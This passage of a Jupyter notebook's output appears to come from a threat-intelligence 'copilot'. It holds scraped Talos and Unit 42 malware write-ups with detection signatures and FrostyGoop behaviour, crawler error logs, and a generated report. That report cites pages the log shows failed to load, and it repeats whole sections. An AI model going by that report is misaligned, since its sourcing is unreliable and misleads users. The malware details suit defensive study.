            "[Cisco Secure Firewall](https://www.cisco.com/c/en/us/products/security/firewalls/index.html) (formerly Next-Generation Firewall and Firepower NGFW) appliances such as [Threat Defense Virtual](https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html), [Adaptive Security Appliance](https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html) and [Meraki MX](https://meraki.cisco.com/products/appliances) can detect malicious activity associated with this threat.\n",
            "[Cisco Secure Malware Analytics](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html) (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.\n",
            "[Umbrella](https://umbrella.cisco.com/), Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella [here](https://signup.umbrella.com/?utm_campaign=umbrella-free-trial&utm_content=automated-free-trial&utm_medium=web-referral%3Futm_source%3Dcisco&utm_term=pgm-talos-trial).\n",
            "[Cisco Secure Web Appliance](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html) (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.\n",
            "Additional protection with context to your specific environment and threat data are available from the [Firewall Management Center](https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html).\n",
            "[Cisco Duo](https://signup.duo.com/?utm_campaign=duo-free-trial&utm_medium=referral&utm_source=talos) provides multi-factor authentication for users to ensure only those authorized are accessing your network.\n",
            "Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on [Snort.org](https://www.snort.org/products). Snort SIDs for this threat are listed below:\n",
            "Snort2: 64217, 64204, 64216, 64215, 64214, 64213, 64212, 64211, 64210, 64209, 64208, 64207, 64206, 64205, 64203\n",
            "Snort3: 301057, 301063, 301062, 301061, 301060, 301059, 64217, 301058\n",
            "ClamAV detections are also available for this threat:\n",
            "Win.Loader.RustLoader-10036712-0\n",
            "Py.Infostealer.PXAStealer-10036718-0\n",
            "Py.Infostealer.PXAStealer-10036725-0\n",
            "Txt.Tool.PXAStealerInstaller-10036719-0\n",
            "Txt.Tool.PXAStealerInstaller-10036724-0\n",
            "Txt.Tool.PXAStealerInstaller-10036724-0\n",
            "Lnk.Downloader.PXAStealer-10036720-0\n",
            "Js.Infostealer.CookieStealer-10036722-0\n",
            "Indicators of Compromise\n",
            "IOCs for this research can be found in our GitHub repository [here](https://github.com/Cisco-Talos/IOCs/tree/main/2024/11).\n",
            "Share this post\n",
            "* [](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "* [](https://x.com/share?url=https%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "* [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "* [](https://www.reddit/submit?url=https%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "* [](mailto:?body=New+PXA+Stealer+targets+government+and+education+sectors+for+sensitive+informationhttps%3A%2F%2Fblog.talosintelligence.com%2Fnew-pxa-stealer%2F)\n",
            "Related Content\n",
            "[Threat actors use copyright infringement phishing lure to deploy infostealers\n",
            "October 31, 2024 09:37\n",
            "* Cisco Talos has observed an unknown threat actor conducting a phishing campaign targeting Facebook business and advertising account users in Taiwan. * The decoy email and fake PDF filenames are designed to impersonate a company's legal department, attempting to lure the victim into downloading and executing malware. * This campaign](https://blog.talosintelligence.com/threat-actors-use-copyright-infringement-phishing-lure-to-deploy-infostealers/)\n",
            "[Threat Spotlight: WarmCookie/BadSpace\n",
            "October 23, 2024 06:02\n",
            "WarmCookie is a malware family that emerged in April 2024 and has been distributed via regularly conducted malspam and malvertising campaigns.](https://blog.talosintelligence.com/warmcookie-analysis/)\n",
            "[Highlighting TA866/Asylum Ambuscade Activity Since 2021\n",
            "October 23, 2024 06:02\n",
            "TA866 (also known as Asylum Ambuscade) is a threat actor that has been conducting intrusion operations since at least 2020.](https://blog.talosintelligence.com/highlighting-ta866-asylum-ambuscade/)\n",
            "*\n",
            "+ Intelligence Center\n",
            "+ [Intelligence Search](https://talosintelligence.com/reputation_center)\n",
            "+ [Email & Spam Trends](https://talosintelligence.com/reputation_center/email_rep)\n",
            "*\n",
            "+ Vulnerability Research\n",
            "+ [Vulnerability Reports](https://talosintelligence.com/vulnerability_info)\n",
            "+ [Microsoft Advisories](https://talosintelligence.com/ms_advisories)\n",
            "*\n",
            "+ Incident Response\n",
            "+ [Talos IR Capabilities](https://talosintelligence.com/incident_response)\n",
            "+ [Emergency Support](https://talosintelligence.com/incident_response)\n",
            "*\n",
            "+ Security Resources\n",
            "+ [Open Source Security Tools](https://talosintelligence.com/software)\n",
            "+ [Intelligence Categories Reference](https://talosintelligence.com/categories)\n",
            "+ [Secure Endpoint Naming Reference](https://talosintelligence.com/secure-endpoint-naming)\n",
            "*\n",
            "+ Media\n",
            "+ [Talos Intelligence Blog](https://blog.talosintelligence.com/)\n",
            "+ [Threat Source Newsletter](https://blog.talosintelligence.com/category/threat-source-newsletter/)\n",
            "+ [Beers with Talos Podcast](https://talosintelligence.com/podcasts/shows/beers_with_talos)\n",
            "+ [Talos Takes Podcast](https://talosintelligence.com/podcasts/shows/talos_takes)\n",
            "+ [Talos Videos](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)\n",
            "*\n",
            "+ Support\n",
            "+ [Support Documentation](https://support.talosintelligence.com/)\n",
            "*\n",
            "+ Company\n",
            "+ [About Talos](https://talosintelligence.com/about)\n",
            "+ [Careers](https://talosintelligence.com/careers)\n",
            "+ [Cisco Security](https://www.cisco.com/c/en/us/products/security/product-listing.html)\n",
            "Follow us\n",
            "*\n",
            "[](https://x.com/talossecurity)\n",
            "*\n",
            "[](https://www.youtube.com/channel/UCPZ1DtzQkStYBSG3GTNoyfg/featured)\n",
            "*\n",
            "[](https://www.linkedin.com/company/cisco-talos-intelligence-group/)\n",
            "[](http://tools.cisco.com/security/center/home.x)\n",
            "© 2024 Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our [Privacy Policy.](http://www.cisco.com/web/siteassets/legal/privacy_full.html)\n",
            "Highlights: ['The compressed packages provided by the threat actor often contain not only the executable files for these tools but also their source code, allowing users to modify them as needed. Hotmail batch creation tool from telegram channel. Hotmail cookie batch modification tool from telegram channel. We found that the attacker is not sharing all the tools for free, and some of them require users to send a unique key back to the Telegram channel administrator for software activation. This process ensures that only those who have been vetted or have paid for the tool can access its full functionality.']\n",
            "Highlight Scores: [0.4289257526397705]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Title: FrostyGoop’s Zoom-In: A Closer Look into the Malware Artifacts, Behaviors and Network Communications\n",
            "URL: https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/\n",
            "ID: https://unit42.paloaltonetworks.com/frostygoop-malware-analysis/\n",
            "Score: 0.13377809524536133\n",
            "Published Date: 2024-11-19T00:00:00.000Z\n",
            "Author: Chris Navarrete; Asher Davila\n",
            "Image: None\n",
            "Extras None\n",
            "Subpages: None\n",
            "Text: Executive Summary\n",
            "In July 2024, the operational technology (OT)-centric malware FrostyGoop/BUSTLEBERM became publicly known, after attackers used it to disrupt critical infrastructure. The outage occurred after the Cyber Security Situation Center (CSSC), affiliated with the Security Service of Ukraine, disclosed details [PDF] of an attack on a municipal energy company in Ukraine in early 2024.\n",
            "FrostyGoop is the ninth reported OT-centric malware, but the first that used Modbus TCP communications to impact the power supply to heating services for over 600 apartment buildings. FrostyGoop can be used both within a compromised perimeter and externally if the target device is accessible over the internet. FrostyGoop sends Modbus commands to read or modify data on industrial control systems (ICS) devices, causing damage to the environment where attackers installed it.\n",
            "Based on this reporting, we conducted a deeper analysis and uncovered new samples of FrostyGoop and other related indicators. These new indicators include configuration files and libraries used by the malware, as well as artifacts associated with an infection. We also investigate network communications and provide new insights based on open-source intelligence (OSINT) data and our own telemetry.\n",
            "OT malware is an increasing concern of security professionals across the globe, and FrostyGoop provides a notable case study of this growing threat.\n",
            "Palo Alto Networks customers are better protected from the threats discussed in this article through our products and services such as the following:\n",
            " Industrial OT Security Solution \n",
            "Information provided by Palo Alto Networks Next-Generation Firewall with Advanced Threat Prevention \n",
            " Advanced WildFire \n",
            " Cortex Xpanse \n",
            " Cortex XDR and Cortex XSIAM \n",
            " Prisma Cloud \n",
            "If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.\n",
            " Related Unit 42 Topics \n",
            "  JSON ,  IoT Security, Russia  \n",
            "  Technical Analysis of FrostyGoop\n",
            "Attackers employed this malware associated with Russian actors in a cyberattack that caused a two-day heating system outage affecting over 600 apartment buildings in Ukraine, during sub-zero temperatures.\n",
            "According to an open-source report, attackers made the initial compromise through a vulnerability in a MikroTik router. However, we have not confirmed this delivery method and bad actors might instead have delivered the malware via OT devices exposed to the internet.\n",
            "FrostyGoop makes use of the Modbus TCP protocol to interact directly with ICS/OT devices, and therefore it is considered an ICS-centric malware. This is the ninth known ICS-centric malware.\n",
            "In addition, Modbus is one of the most common protocols used in critical infrastructure. During this attack, the adversaries dispatched Modbus commands to ENCO control devices, leading to inaccurate measurements and system malfunctions. Remediating these issues took nearly two days.\n",
            "Although bad actors used the malware to attack ENCO control devices, the malware can attack any other type of device that speaks Modbus TCP. Our telemetry indicates that 1,088,175 Modbus TCP devices were exposed to the internet from Sept. 2-Oct. 2, 2024, and 6,211,623 devices were exposed overall.\n",
            "The details needed by FrostyGoop to establish a Modbus TCP connection and send Modbus commands to a targeted ICS device can be provided as command-line arguments or included in a separate JSON configuration file.\n",
            "   Malware Samples Analysis \n",
            "FrostyGoop is compiled using the Go programming language, sometimes referred to as Golang. The malware uses a relatively obscure open-source Modbus implementation.\n",
            "Further analysis of the Modbus library revealed this implementation does not natively support supplying arguments using a JSON file, making this a strong identifier for the malware. Moreover, the JSON object structure follows a specific format based on the commands this malware supports. FrostyGoop also contains capabilities for logging the output to a console or to a JSON file.\n",
            "Attackers can supply two types of parameters to FrostyGoop:\n",
            "The first type of parameter consists of the possible operations an attacker can execute toward the registers of a Modbus device\n",
            "The second parameter consists of timing configurations.\n",
            "Figure 1 shows an example of the first type of parameter for an operation using Tasks and Iplist under the register for .\n",
            " Figure 1. Binary Ninja showing FrostyGoop operations for and under the register. \n",
            "Figure 2 shows an example of an operation for , , , and under the register for .\n",
            " Figure 2. Binary Ninja showing FrostyGoop operations for , , , and under the register. \n",
            "Figure 3 shows the timing configuration for .\n",
            " Figure 3. Binary Ninja showing FrostyGoop timing configuration in the registry entry under . \n",
            "FrostyGoop also leverages Goccy’s go-json library, a faster JSON encoder and decoder compatible with the Go programming language standard package. In addition, it incorporates a specific open-source execution controller named queues. The relative obscurity of this code means it can serve as another possible indicator of FrostyGoop.\n",
            "Figure 4 shows our analysis of a Windows executable file for FrostyGoop within the tool Binary Ninja. This analysis reveals URLs from open-source libraries for modbus, go-json and queues.\n",
            " Figure 4. Open-source libraries: Modbus, go-json and queues. \n",
            "Although not all FrostyGoop samples contain the strings shown in Figure 4, other strings contained within those libraries can serve as part of the detection for this malware.\n",
            "FrostyGoop also implements a debugger evasion technique by checking the value in Windows' Process Environment Block (PEB). Figure 5 shows this method in the disassembled code from a FrostyGoop sample. This method provides an alternative way to check the PEB's flag without calling . Attackers use this technique to detect and avoid debuggers used by malware analysts.\n",
            " Figure 5. Disassembled code from a FrostyGoop sample showing a check for the PEB's flag. \n",
            "  Go-encrypt.exe Sample Analysis\n",
            "Our investigation revealed a Windows executable sample named   written in Go that was not FrostyGoop, but it originally appeared on the same approximate date that other indicators of FrostyGoop were reported. Command-line options for this software reveal the file is used to encrypt and decrypt JSON files as illustrated in Figure 6.\n",
            " Figure 6. Command-line options for . \n",
            "After executing using the argument, it creates two files:\n",
            "An encrypted JSON\n",
            "A 32-byte file containing a decryption key named \n",
            "Figure 7 shows the encryption, decryption and the generated key.\n",
            " Figure 7. Using to encrypt and decrypt a JSON file. \n",
            "Figure 8 shows the content of an encrypted JSON file generated by .\n",
            " Figure 8. An encrypted JSON file viewed in a hex editor. \n",
            "Figure 9 shows a filtered list of processes generated by in Process Monitor. We have highlighted when created the decryption file named and the 32 character content of this file.\n",
            " Figure 9. Process Monitor showing generating the key file. \n",
            "Decompiling revealed it uses the Cipher Feedback (CFB) mode of the AES encryption algorithm to create the encryption/decryption key in the file as shown in Figures 10 and 11.\n",
            " Figure 10. Decompiled code of showing its AES main encryption routine. \n",
            " Figure 11. Decompiled code of showing CFB mode. \n",
            "As shown previously for the key generated in Figure 7, the key value is in decimal format. The decimal value of the\n",
            "Highlights: ['OT malware is an increasing concern of security professionals across the globe, and FrostyGoop provides a notable case study of this growing threat. Palo Alto Networks customers are better protected from the threats discussed in this article through our products and services such as the following: Information provided by Palo Alto Networks Next-Generation Firewall with Advanced Threat Prevention  If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team. Attackers employed this malware associated with Russian actors in a cyberattack that caused a two-day heating system outage affecting over 600 apartment buildings in Ukraine, during sub-zero temperatures.']\n",
            "Highlight Scores: [0.5307855606079102]\n",
            "Summary: None\n",
            "\n",
            "\n",
            "Autoprompt String: Here is the latest cyber incident report about the LunarsGo Threat Actor Group in 2024:\n",
            "Resolved Search Type: 2024-11-14T10:32:33.393Z\n",
            "Exa Search results are not a SearchResponse. Type: <class 'exa_py.api.SearchResponse'>\n",
            "[INIT].... → Crawl4AI 0.4.21\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "<ipython-input-22-6e8112d6278b>:288: DeprecationWarning: Cache control boolean flags are deprecated and will be removed in version 0.5.0. Use 'cache_mode' parameter instead.\n",
            "  result = await crawler.arun(\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[INIT].... → Crawl4AI 0.4.21\n",
            "[INIT].... → Crawl4AI 0.4.21\n",
            "[INIT].... → Crawl4AI 0.4.21\n",
            "[INIT].... → Crawl4AI 0.4.21\n",
            "[ERROR]... × https://www.cm-alliance.com/cybersecurity-blog/may... | Error: \n",
            "┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐\n",
            "│ × Unexpected error in _crawl_web at line 11 in load_js_script (../usr/local/lib/python3.10/dist-                      │\n",
            "│ packages/crawl4ai/js_snippet/__init__.py):                                                                            │\n",
            "│   Error: Script update_image_dimensions not found in the folder /usr/local/lib/python3.10/dist-                       │\n",
            "│ packages/crawl4ai/js_snippet                                                                                          │\n",
            "│                                                                                                                       │\n",
            "│   Code context:                                                                                                       │\n",
            "│   6       current_script_path = os.path.dirname(os.path.realpath(__file__))                                           │\n",
            "│   7       # Get the path of the script to load                                                                        │\n",
            "│   8       script_path = os.path.join(current_script_path, script_name + '.js')                                        │\n",
            "│   9       # Check if the script exists                                                                                │\n",
            "│   10       if not os.path.exists(script_path):                                                                        │\n",
            "│   11 →         raise ValueError(f\"Script {script_name} not found in the folder {current_script_path}\")                │\n",
            "│   12       # Load the content of the script                                                                           │\n",
            "│   13       with open(script_path, 'r') as f:                                                                          │\n",
            "│   14           script_content = f.read()                                                                              │\n",
            "│   15       return script_content                                                                                      │\n",
            "└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘\n",
            "\n",
            "ERROR: Failed to crawl the page https://www.cm-alliance.com/cybersecurity-blog/may-2024-biggest-cyber-attacks-data-breaches-ransomware-attacks\n",
            "[ERROR]... × https://purplesec.us/breach-report/... | Error: \n",
            "┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐\n",
            "│ × Unexpected error in _crawl_web at line 11 in load_js_script (../usr/local/lib/python3.10/dist-                      │\n",
            "│ packages/crawl4ai/js_snippet/__init__.py):                                                                            │\n",
            "│   Error: Script update_image_dimensions not found in the folder /usr/local/lib/python3.10/dist-                       │\n",
            "│ packages/crawl4ai/js_snippet                                                                                          │\n",
            "│                                                                                                                       │\n",
            "│   Code context:                                                                                                       │\n",
            "│   6       current_script_path = os.path.dirname(os.path.realpath(__file__))                                           │\n",
            "│   7       # Get the path of the script to load                                                                        │\n",
            "│   8       script_path = os.path.join(current_script_path, script_name + '.js')                                        │\n",
            "│   9       # Check if the script exists                                                                                │\n",
            "│   10       if not os.path.exists(script_path):                                                                        │\n",
            "│   11 →         raise ValueError(f\"Script {script_name} not found in the folder {current_script_path}\")                │\n",
            "│   12       # Load the content of the script                                                                           │\n",
            "│   13       with open(script_path, 'r') as f:                                                                          │\n",
            "│   14           script_content = f.read()                                                                              │\n",
            "│   15       return script_content                                                                                      │\n",
            "└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘\n",
            "\n",
            "ERROR: Failed to crawl the page https://purplesec.us/breach-report/\n",
            "[ERROR]... × https://www.picussecurity.com/resource/blog/may-10... | Error: \n",
            "┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐\n",
            "│ × Unexpected error in _crawl_web at line 11 in load_js_script (../usr/local/lib/python3.10/dist-                      │\n",
            "│ packages/crawl4ai/js_snippet/__init__.py):                                                                            │\n",
            "│   Error: Script update_image_dimensions not found in the folder /usr/local/lib/python3.10/dist-                       │\n",
            "│ packages/crawl4ai/js_snippet                                                                                          │\n",
            "│                                                                                                                       │\n",
            "│   Code context:                                                                                                       │\n",
            "│   6       current_script_path = os.path.dirname(os.path.realpath(__file__))                                           │\n",
            "│   7       # Get the path of the script to load                                                                        │\n",
            "│   8       script_path = os.path.join(current_script_path, script_name + '.js')                                        │\n",
            "│   9       # Check if the script exists                                                                                │\n",
            "│   10       if not os.path.exists(script_path):                                                                        │\n",
            "│   11 →         raise ValueError(f\"Script {script_name} not found in the folder {current_script_path}\")                │\n",
            "│   12       # Load the content of the script                                                                           │\n",
            "│   13       with open(script_path, 'r') as f:                                                                          │\n",
            "│   14           script_content = f.read()                                                                              │\n",
            "│   15       return script_content                                                                                      │\n",
            "└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘\n",
            "\n",
            "ERROR: Failed to crawl the page https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits\n",
            "[ERROR]... × https://socradar.io/hsbc-barclays-and-uk-gov-datab... | Error: \n",
            "┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐\n",
            "│ × Unexpected error in _crawl_web at line 11 in load_js_script (../usr/local/lib/python3.10/dist-                      │\n",
            "│ packages/crawl4ai/js_snippet/__init__.py):                                                                            │\n",
            "│   Error: Script update_image_dimensions not found in the folder /usr/local/lib/python3.10/dist-                       │\n",
            "│ packages/crawl4ai/js_snippet                                                                                          │\n",
            "│                                                                                                                       │\n",
            "│   Code context:                                                                                                       │\n",
            "│   6       current_script_path = os.path.dirname(os.path.realpath(__file__))                                           │\n",
            "│   7       # Get the path of the script to load                                                                        │\n",
            "│   8       script_path = os.path.join(current_script_path, script_name + '.js')                                        │\n",
            "│   9       # Check if the script exists                                                                                │\n",
            "│   10       if not os.path.exists(script_path):                                                                        │\n",
            "│   11 →         raise ValueError(f\"Script {script_name} not found in the folder {current_script_path}\")                │\n",
            "│   12       # Load the content of the script                                                                           │\n",
            "│   13       with open(script_path, 'r') as f:                                                                          │\n",
            "│   14           script_content = f.read()                                                                              │\n",
            "│   15       return script_content                                                                                      │\n",
            "└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘\n",
            "\n",
            "ERROR: Failed to crawl the page https://socradar.io/hsbc-barclays-and-uk-gov-databases-compromised/\n",
            "[ERROR]... × https://cybersecurityventures.com/intrusion-daily-... | Error: \n",
            "┌───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐\n",
            "│ × Unexpected error in _crawl_web at line 11 in load_js_script (../usr/local/lib/python3.10/dist-                      │\n",
            "│ packages/crawl4ai/js_snippet/__init__.py):                                                                            │\n",
            "│   Error: Script update_image_dimensions not found in the folder /usr/local/lib/python3.10/dist-                       │\n",
            "│ packages/crawl4ai/js_snippet                                                                                          │\n",
            "│                                                                                                                       │\n",
            "│   Code context:                                                                                                       │\n",
            "│   6       current_script_path = os.path.dirname(os.path.realpath(__file__))                                           │\n",
            "│   7       # Get the path of the script to load                                                                        │\n",
            "│   8       script_path = os.path.join(current_script_path, script_name + '.js')                                        │\n",
            "│   9       # Check if the script exists                                                                                │\n",
            "│   10       if not os.path.exists(script_path):                                                                        │\n",
            "│   11 →         raise ValueError(f\"Script {script_name} not found in the folder {current_script_path}\")                │\n",
            "│   12       # Load the content of the script                                                                           │\n",
            "│   13       with open(script_path, 'r') as f:                                                                          │\n",
            "│   14           script_content = f.read()                                                                              │\n",
            "│   15       return script_content                                                                                      │\n",
            "└───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘\n",
            "\n",
            "ERROR: Failed to crawl the page https://cybersecurityventures.com/intrusion-daily-cyber-threat-alert/\n",
            "Crawled Results: []\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://assets.weforum.org/editor/ojr0Cc1taevkO8zRgW2EdfBNPqYqviT1_RMGRgB-JW8.png\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://assets.esecurityplanet.com/uploads/2024/05/ESP_2023CybersecurityReports_24_KD_rnd1.png\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/02/image-4-724x1024.png\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://socradar.io/wp-content/uploads/2024/08/Top-10-Threat-Actors-Mind-Map.png.webp\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://waterfall-security.com/wp-content/uploads/2024/03/newest-incident-chart-for-2024.png\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://www.itgovernanceusa.com/blog/wp-content/uploads/2024/06/image-10.png\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://cyberint.com/wp-content/uploads/2024/01/Untitled-design-2024-01-10T151216.652-1-1024x529.webp\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://socradar.io/wp-content/uploads/2024/07/ocd-threat-actors.png.webp\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<img src=\"https://www.itgovernanceusa.com/blog/wp-content/uploads/2024/05/image-13.png\" width=\"400\"/>"
            ],
            "text/plain": [
              "<IPython.core.display.Image object>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Cyber AI Copilot Response:\n",
            "**Executive Summary**\n",
            "\n",
            "This analysis synthesizes the latest intelligence on cyber threats, data breaches, and ransomware attacks from various credible sources. The findings highlight the increasing sophistication of threat actors, the emergence of new vulnerabilities, and the growing importance of incident response. The report provides actionable recommendations for mitigating these threats and protecting against future attacks. [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "**In-Depth Analysis**\n",
            "\n",
            "### ****Threat Actor Group**** [Google Programmable Search](https://socradar.io/hsbc-barclays-and-uk-gov-databases-compromised/)\n",
            "\n",
            "The report highlights the activities of several threat actor groups, including: [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "*   **Chinese-backed hackers**: Conducting large-scale data exfiltration operations against government institutions in Thailand.\n",
            "*   **Cyber gangs**: Engaging in phishing campaigns and ransomware attacks against various organizations.\n",
            "*   **Nation-state actors**: Utilizing advanced tactics, techniques, and procedures (TTPs) to compromise critical infrastructure. [Google Serper](https://www.csis.org/programs/strategic-technologies-program/significant-cyber-incidents)\n",
            "\n",
            "### ****Cyber Attack**s and **Data Breach**es** [Google Serper](https://purplesec.us/breach-report/)\n",
            "\n",
            "The report documents several high-profile cyber attacks and data breaches, including: [Google Serper](https://www.cm-alliance.com/cybersecurity-blog/may-2024-biggest-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "\n",
            "*   **HSBC and Barclays**: Suffered unauthorized network access, compromising sensitive data.\n",
            "*   **Nidec**: Experienced a ransomware attack, resulting in the leak of stolen company data online.\n",
            "*   **Saudi Aramco**: Suffered a $50 million data breach, compromising sensitive information. [Google Serper](https://purplesec.us/breach-report/)\n",
            "\n",
            "### **Vulnerabilities and **Exploit**s** [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "The report highlights several newly discovered vulnerabilities and exploits, including: [Google Serper](https://www.cm-alliance.com/cybersecurity-blog/may-2024-biggest-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "\n",
            "*   **CVE-2024-0012**: Affecting specific versions of PAN-OS software, allowing for authentication bypass.\n",
            "*   ****Ransomware****: Utilizing advanced TTPs to evade detection and compromise systems. [Google Serper](https://unit42.paloaltonetworks.com/)\n",
            "\n",
            "### ****Incident Response**** [Google Serper](https://www.cm-alliance.com/cybersecurity-blog/may-2024-biggest-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "\n",
            "The report emphasizes the importance of effective incident response, including: [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "*   **Timely containment**: Isolating affected systems and preventing further damage.\n",
            "*   **Coordinated response**: Collaborating with stakeholders to share intelligence and best practices.\n",
            "*   **Post-incident analysis**: Conducting thorough investigations to identify root causes and improve response strategies. [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "### **Recommendations** [Google Serper](https://www.cm-alliance.com/cybersecurity-blog/may-2024-biggest-cyber-attacks-data-breaches-ransomware-attacks)\n",
            "\n",
            "The report provides actionable recommendations for mitigating these threats, including: [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "*   **Implementing robust security measures**: Utilizing advanced threat detection and prevention technologies.\n",
            "*   **Conducting regular security audits**: Identifying vulnerabilities and addressing them before they can be exploited.\n",
            "*   **Developing incident response plans**: Establishing clear procedures for responding to cyber attacks and data breaches. [Google Programmable Search](https://socradar.io/hsbc-barclays-and-uk-gov-databases-compromised/)\n",
            "\n",
            "**Most Recent Relevant Activities**\n",
            "\n",
            "The report highlights several recent activities, including: [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "*   **Cyber attacks on government institutions**: Conducted by Chinese-backed hackers and cyber gangs.\n",
            "*   ****Ransomware** attacks**: Utilizing advanced TTPs to evade detection and compromise systems.\n",
            "*   **Data breaches**: Compromising sensitive information, including financial and personal data. [Google Serper](https://www.csis.org/programs/strategic-technologies-program/significant-cyber-incidents)\n",
            "\n",
            "**Source Citations and Evidence**\n",
            "\n",
            "The report cites several credible sources, including: [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "*   **CISA**: Providing guidance on incident response and threat detection.\n",
            "*   ****MITRE ATT&CK****: Offering insights into threat actor TTPs and tactics.\n",
            "*   **Palo Alto Networks**: Sharing information on newly discovered vulnerabilities and exploits. [Google Serper](https://www.cisa.gov/news-events/cybersecurity-advisories)\n",
            "\n",
            "**Long-Term Forecast and Monitoring**\n",
            "\n",
            "The report emphasizes the importance of ongoing monitoring and long-term planning, including: [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "*   **Tracking threat actor activity**: Identifying emerging trends and patterns.\n",
            "*   **Developing response strategies**: Establishing clear procedures for responding to future attacks.\n",
            "*   **Conducting regular security audits**: Identifying vulnerabilities and addressing them before they can be exploited. [Google Programmable Search](https://socradar.io/hsbc-barclays-and-uk-gov-databases-compromised/)\n",
            "\n",
            "**Actionable Recommendations**\n",
            "\n",
            "The report provides actionable recommendations for mitigating these threats, including: [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
            "*   **Implementing robust security measures**: Utilizing advanced threat detection and prevention technologies.\n",
            "*   **Conducting regular security audits**: Identifying vulnerabilities and addressing them before they can be exploited.\n",
            "*   **Developing incident response plans**: Establishing clear procedures for responding to cyber attacks and data breaches. [Google Programmable Search](https://socradar.io/hsbc-barclays-and-uk-gov-databases-compromised/)\n",
            "\n",
            "**Embedded Media Links**\n",
            "\n",
            "The report includes links to relevant visuals, including: [Google Serper](https://www.picussecurity.com/resource/blog/may-10-top-threat-actors-malware-vulnerabilities-and-exploits)\n",
            "\n",
